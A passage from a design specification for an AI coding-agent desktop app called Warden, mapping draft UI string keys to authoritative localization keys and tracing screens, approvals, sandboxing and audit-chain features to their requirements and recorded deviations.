B07 was written in parallel with its own key scheme. Rule for implementers: **where the right-hand column names a B07 key (or a B04/B05 key), that key and its text are authoritative**; the B03 key is only the name these wireframes used while drafting. Keys marked "add to B07" have no equivalent yet; the draft text here is the proposed English string. Several sections of this file already cite the authoritative key directly (for example `gate.g1.subtitle`, `delivery.done.commit`, `approval.jump`).

| B03 key (draft name) | Authoritative key | Used in | Draft or note |
|---|---|---|---|
| `boot.connecting` | `shell.connection.connecting` (B04 C-01) | boot | "Starting the Warden runtime…" |
| `boot.protocol_mismatch` | `error.rpc.protocol_mismatch` | boot | versions of desktop and daemon |
| `error.daemon_disconnected` | `shell.connection.disconnected` (B04), `live.disconnected` | connection Banner, disabled actions | "Lost connection to the runtime. Reconnecting…" |
| `error.<code>` (API errors) | `error.rpc.<code>` | inline errors | one sentence per core §6 code |
| model errors | `error.model.<code>` | task cards, provider tests | per WRD-05 §4 code |
| `error.not_a_repository` | `empty.workspaces.not_git` | first open | "This folder is not a git repository." |
| `setup.title` | `st.1.title` | ST-1 | "Set up model access" |
| `setup.path.api_key`, `.local`, `.company`, `.harness` | `st.1.path.api_key`, `st.1.path.local`, `st.1.path.company`, `st.1.path.harness` | ST-1 cards | |
| `setup.local.detected`, `setup.local.not_detected` | `st.1.detected`, `st.1.none_detected`, `st.1.detect_local` | path B | |
| `setup.local.no_tools` | add to B07 | path B | "No model with tool calling found; use it for read-only questions." |
| `setup.api_key.auth_failed`, `setup.company.auth_failed` | `error.model.auth_failed` | paths A, C | |
| `setup.company.tls_error` | add to B07 | path C | "Could not establish a trusted TLS connection to {host}." |
| `setup.company.admissible` | `tier.group_inside` | path C | "Admissible for confidential data." |
| `setup.harness.pin_only`, `modelpicker.harness_pin_only` | `routing.picker.harness_hint` | path D, ModelPicker | "Harnesses run only when you pin them in a session." |
| `harness.terms.permitted`, `.tolerated`, `.personal_use_only` | `vendor.copilot.notice`, `vendor.codex.notice`, `vendor.claude_code.notice`; badges `vendor.*.badge`; acknowledgments `vendor.codex.enable_ack`, `vendor.claude_code.enable_ack` | path D, SCR-6, harness approval | |
| `harness.locked.shared_mode` | `vendor.claude_code.locked` | path D, SCR-6 | |
| `firstopen.title`, `firstopen.body` | add to B07 (use `class.help.*` for the option descriptions) | first-open dialog | "Classify this workspace" / "Classification decides which models may see this code. Default: confidential." |
| `firstopen.none_admissible` | `st.3.body` | first-open dialog | |
| `classification.tighten.running_notice` | `confirm.class_tighten.note` | F3 | notice, no dialog (B05 §7.4) |
| `classification.loosen.confirm.title`, `.body`, `.action` | `confirm.class_loosen` | F3 dialog | |
| `composer.placeholder`, `composer.readonly_toggle`, `composer.disabled.no_provider`, `composer.disabled.run_active`, `composer.pin_inadmissible` | add to B07 | RequestComposer | "Describe the change to make…" / "Read-only question" / "Configure a model provider first." / "A run is in progress." / "The pinned model is not admissible for this classification." |
| `modelpicker.automatic` | `routing.picker.auto` | ModelPicker | |
| `modelpicker.section.admissible`, `.not_admissible` | `tier.group_inside`, `tier.group_outside` | ModelPicker | |
| `modelpicker.below_threshold` | `routing.below_threshold` | ModelPicker, routing view | |
| `routing.line.chosen`, `.pinned`, `.fallback` | `routing.chosen`, `routing.pinned`, `routing.fallback`, `routing.pinned_fallback` | RoutingLine | |
| `routing.reason.<code>` | `routing.reject.<code>` (+ `tier_not_admitted.detail`) | ModelPicker, routing view, ST-3 | |
| `task.state.<state>`, `task.reason.<reason>` | `state.<state>`, `reason.<reason>` | TaskCard badges | |
| `toolcall.denied` | `policy.denied_row` | tool call view | |
| `toolcall.untrusted_output` | `provenance.untrusted`, `provenance.untrusted_caption` | tool call view | |
| `policy.reason.<rule id>` | `policy.rule.<id>` | ToolCallRow, decision sections | |
| `policy.layers.INV-1` | `policy.deny_layers` | S1 `.env` row | |
| `approval.title.<kind>` | `approval.title` + `approval.what.<kind>` (`install`, `command`, `egress`, `push`, `harness`, `question`) | ApprovalCard | B07 uses one heading and a kind-specific What line |
| `approval.scope.help.<scope>` | `scope.<scope>.explain` (B05 calls it `approval.scope.consequence.<scope>`) | ApprovalCard | |
| `approval.scope.disabled.scope_max` | `scope.disabled.max` (also `scope.disabled.agent`, `scope.disabled.taint`) | ApprovalCard | |
| `approval.scope.locked.r5` | `scope.disabled.risk_r5` | Push card | |
| `approval.taint.notice` | `approval.why.taint` | ApprovalCard | |
| `approval.egress.hold` | `approval.extra.egress_hold`; after refusal `approval.proxy_refused_pending` | egress card | |
| `approval.expires` | `approval.expires` | approval panel; card in the last hour | |
| `approval.question.label` | `approval.what.question`, `approval.answer_placeholder` | question card | answer sent as `approval.resolve.answer` (ID-05) |
| `approval.resolved.approved`, `.rejected`, `.expired`, `.cancelled`, `.revoked` | `approval.resolved.approve`, `.reject`, `.expire`, `.cancel`, `approval.revoked` | status rows | |
| `approval.resolved.elsewhere` | add to B07 | status rows | "Approved in the CLI by {approver} · {scope}" |
| `notify.approval.title`, `notify.approval.body` | same keys | OS notification | |
| `notify.gate_plan`, `notify.gate_final` | `notify.gate.title`, `notify.gate.body` | OS notification | |
| `notify.run_failed` | `notify.failed.title`, `notify.failed.body` | OS notification | |
| `notify.run_blocked` | add to B07 | OS notification | "Warden: run needs input" / "{workspace} · {reason_text}" |
| `badge.pending`, `badge.pending.tooltip` | `approval.pending_badge`, `approval.jump` | PendingApprovalBadge | |
| `plan.title`, `plan.gate.note` | `gate.g1.title`, `gate.g1.subtitle` | SCR-3 | |
| `plan.edit.notice` | `plan.intentNote` (B05), `gate.g1.edited_note` after save | SCR-3 edit | |
| `plan.edit.validation.*` | `plan.error.<code>` (B05 §7.2) | SCR-3 edit | |
| `plan.edit.discard_confirm` | `confirm.discard_plan_edit` | SCR-3 edit | |
| `cost.local_note` | `cost.zero_local` | PlanCard, CostPanel | |
| `cost.quota_note` | `cost.quota` | CostPanel | |
| `chain.verified`, `.unverified`, `.verifying`, `.failed` | same keys | StatusBadge chain | |
| `result.title`, `result.nothing_applied` | `gate.g2.title`, `gate.g2.subtitle` | SCR-5 | |
| `result.reject.confirm` | `gate.reject.confirm.gate-final` (B04); button label `gate.g2.reject` must read "Discard result" (ID-01) | SCR-5 | inline, not modal: "Discard this result? The run ends and nothing is delivered." |
| `delivery.accepted`, `delivery.discarded` | add to B07 | GateBar status | "Result accepted by you · {time}. Run succeeded." / "Result discarded by you · {time}. Nothing was delivered." |
| `result.failed.title`, `result.failed.body` | `gate.failed_verification.title`, `gate.failed_verification.body` | SCR-5 read-only | |
| `deliver.*` (commit, apply, push, export, done, rejected) | `delivery.*`, `confirm.commit`, `confirm.apply_branch`, `confirm.apply_branch.exists`, `confirm.push`, `confirm.export_patch` | GateBar, dialogs | |
| `deliver.push.disabled` | `delivery.push_needs_approval` | Push button | |
| `delivery.unavailable_failed` | same key | read-only result | |
| `deliver.chain_failed_note` | add to B07 | Commit and Push dialogs under ST-6 | "The audit chain of this session failed verification." |
| `diff.split_unavailable` | add to B07 | DiffViewer | "Split view needs a wider window." |
| `state.no_provider.*` | `st.1.*` | ST-1 | |
| `state.sandbox_missing.*` (incl. `.action_disabled`) | `st.2.title`, `st.2.body`, `st.2.action` | ST-2, disabled controls | |
| `state.no_admissible.*` | `st.3.title`, `st.3.body`, `st.3.note`, `st.3.action.*` | ST-3 | Continue action (`session.setPin`, ID-04, ID-16) needs a key: add `st.3.action.continue_on` ("Continue on {model_id} ({tier})") and `st.3.fallback_body` ("{model_id} ({tier}) is unavailable ({cause}). Fallback never moves to a higher tier on its own.") |
| `state.budget.*` (incl. `.over_max`) | `st.4.*`, `confirm.budget_raise`, `confirm.budget_raise.over_max` | ST-4 | |
| `state.cancelled.*` | `st.5.title`, `st.5.body`, `live.cancelled` | ST-5 | |
| `cancel.in_progress`, `cancel.slow` | `cancel.stopping`, `cancel.stoppingSlow` (B04); `cancel.action` | F4 | |
| `resume.from_gate`, `resume.unavailable` | `resume.action`, `st.5.action.resume`; `resume.noGate` (B05) | ResumeBar | |
| `state.chain_failed.*` | `st.6.title`, `st.6.body`, `st.6.action.*`, `st.6.kind.<kind>` | ST-6 | |
| `audit.export.warning_failed_chain`, `audit.export.done` | `st.6.export_warning`, `audit.export_done` | F6 | |
| `empty.*` | same keys (`empty.workspaces`, `empty.sessions`, `empty.timeline`, `empty.providers`, `empty.audit`, `empty.doctor`) | empty states | |

## Traceability

| Design element | WRD source (doc §) | Requirement / invariant satisfied |
|---|---|---|
| Seven screens and six states specified (§2 to §9) | WRD-16 §13; WRD-11 §2, §3 | WRD-16 §13 design deliverables (2) and (3) |
| Session view grid with fixed timeline and fluid panel; drawer below 1180 (§10.1) | WRD-11 §2.2; WRD-16 §13 screen 2 | One request one timeline; widths 1024 to 1920 |
| RoutingLine and routing view with candidates and reasons (§10.3.5, §10.5.2) | WRD-06 §6, §11; WRD-16 §3 step 3 | F-MD-3, F-MD-5; explain the machine |
| ModelPicker admissible and greyed rows with `tier_not_admitted` (§10.4.3) | WRD-16 §3 step 7, §6.3, §13 screen 2 | BI-7 visible in the UI |
| ToolCallRow: decision (effect, rule id) with every call; denied rows without prompt (§10.3.6) | WRD-08 §3, §4; WRD-16 §4.3 S1, S2 | BI-1 visible; F-PL-4 |
| Tool call view: decision above effect; two decisions around an approval (§10.5.3) | WRD-11 §1.1; core §13.1 (CF-40) | BI-1 |
| Untrusted output label and Context tab trust tags (§10.5.1, §10.5.3) | WRD-16 §7.3; WRD-10 | BI-4 |
| No secret values in any region; masked inputs; redaction chips only (§7, §10.3.6) | WRD-16 §10.5; WRD-09 §1 | BI-3 |
| Sandbox badge with mounts summary; ST-2 blocking, no fallback (§9.2, §10.2) | WRD-16 §10.1 to §10.3; WRD-11 §3 | BI-2 |
| Capability summary chip from the runtime (not the repo) (§10.2) | WRD-16 §3 step 2; WRD-08 §4 | BI-5 (repository content cannot widen what is shown or allowed) |
| CLI disclosure in every panel view (§10.5.1, §11.2, §12.3) | WRD-11 §1.5, §4; WRD-16 §14 | BI-6 |
| PlanCard read and edit modes, validation, `edited_artifact` (§11) | WRD-16 §13 screen 3; CF-12, CF-32 | G1; plan edit rate metric (WRD-11 §7) |
| ApprovalCard: what, who, why, scope limited by `scope_max`, Explain, keys A, R, 1 to 4 (§12.1) | WRD-11 §2.3; WRD-08 §7; WRD-16 §13 screen 4 | F-PL-3; approvals never auto-dismiss |
| Push approval fixed to `once` (§12.2, §13.7) | WRD-16 §9, §13 screen 5; WRD-08 §7 | R5 never persistable |
| OS notification and pending badge (§12.5, §12.6) | WRD-11 §2.3 | H6 (time to first approval) |
| G2 review: diff per file, unified/split, hunk → task/step provenance, test report, cost, chain status (§13) | WRD-16 §13 screen 5; WRD-11 §2.4; CF-37, CF-26 | H4, H5; F-AU-3 |
| Delivery actions and confirmations; Push as approval (§13.7, §13.8) | WRD-16 §3 step 6, §13 screen 5 | WRD-11 §1.4 (nothing applied without the final gate) |
| Accept ends the run; Discard cancels it (rejected); delivery post-run with `workflow.delivered`; commit publishes `warden/<ulid>`; push after commit or apply (§13.7) | core §15 ID-01, ID-02, ID-03 | BI-1 (every delivery passes the PDP with `actor.kind: user`) |
| Install approvals preselect Workspace, others Once (§12.1) | core §15 ID-08; WRD-16 §3 step 4 | H6 (prompt reduction) |
| ST-3 Continue and fallback pause via `session.setPin` (§9.3) | core §15 ID-04, ID-16; CF-44 | BI-7 (fallback never widens the tier on its own) |
| Question answers via `approval.resolve.answer`; rejected approvals return the task to running (§12.2, §12.4) | core §15 ID-05, ID-10 | BI-4 (answer tagged as input) |
| Verify-2 with no model call when green (§10.3.4, §13.6) | core §15 ID-09 | H4 |
| Hunk provenance chips from `provenance{…, contributors[]}` (§13.4) | core §15 ID-11; WRD-16 §13 | H5 |
| Polite announcement, no focus move on arrival (§12.1) | core §15 ID-15; WRD-11 §6 | WCAG 2.2 AA (B05) |
| Failed-verification read-only result (§13.10) | WRD-16 H4; CF-24 | H4 |
| Budget state with `session.setBudget` (§9.4) | WRD-11 §3; CF-07 | budgets session 5, daily 15 |
| Cancelled state with Resume from G1 (§9.5) | WRD-11 §3; WRD-16 §15 item 10 | F-WS-4 |
| Chain failed banner, export with warning (§9.6) | WRD-11 §3; WRD-09 §4 | H5 |

## Deviations and assumptions

- DEV: WRD-11 §2.4 per-file accept/revert and "test results per file" are not shown (CF-37; WRD-16 §13 screen 5 governs).
- DEV: WRD-16 §13 screen 3 action "Cancel" is labeled "Reject plan" (B01 deviation); run cancellation stays available through Cancel run.
- DEV: WRD-11 §2.2 "Explore" and "Integration" entries do not exist in the PoC (CF-43; no integrator).
- NEW: sub-components and variants `RunHeader`, `RunStatusStrip`, `ResumeBar`, `BudgetCard`, `CancelledEntry`, compact timeline mode, review layout; `SessionHeader` is the second header row of B04 C-01 `AppShell`; B04 may fold the others into its inventory.
- Alignment with B04 and B05 (both written in parallel; B05 is authoritative on behaviour): G1 `PlanCard` inline in the timeline with the `GateBar` sticky at the bottom of the timeline column (B04 C-13, B05 §7.1); focus does not move on arrival; `Mod+E` edit, `Mod+Enter` save and approve, inline reject confirmation; at G2 `A` accepts (and, per ID-01, ends the run), delivery while the gate is open is "Accept and …", Push has a target dialog, Iterate approves with comment `iterate` (B05 §7.5, §7.6); revoke without confirmation (B05 §6.6); pending badge in the session header with segments (B05 §6.7).
- DEV from B04 C-13 (B04 is adopting it): in the G2 review layout the `GateBar` is sticky at the bottom of the review panel rather than the timeline column, because the compact timeline (320 to 360) cannot hold the delivery toolbar; the focus context (GateBar plus gate entry) is unchanged.
- Default scope follows core §15 ID-08: Once, except `user.package-install` approvals, which preselect Workspace when allowed.
- Integration decisions applied (core §15): ID-01 (gate outcomes), ID-02 and ID-03 (post-run delivery, `workflow.delivered`, commit publishes the branch, push after commit or apply), ID-04 and ID-16 (`session.setPin`, fallback pause), ID-05 (question answers), ID-08, ID-09, ID-10, ID-11, ID-13 (API additions used in place of earlier assumptions), ID-15.
- ASM: token values in §0.1 (B06 authoritative).
- ASM: `artifact.read` accepts `tool.exec.end.output_ref` (§10.5.3).
- ASM: `approval.requested.display.taint_sources[]` (§12.1).
- ASM: the plan-edit JSON sent as `edited_artifact` recomputes `expected_files` as the union of step files and keeps `risks` and `estimate` unchanged (§11.3).
- ASM: delivery stays available under ST-6 with a note (OQ candidate: recommended to keep it available, since the chain state is evidence for review, not an access control).
- OQ-candidate: notification privacy for `confidential` (§12.5; B01 §12).
- NEW (B07 keys proposed): `delivery.accepted`, `delivery.discarded`, `st.3.fallback_body`, `st.3.action.continue_on` (§15).
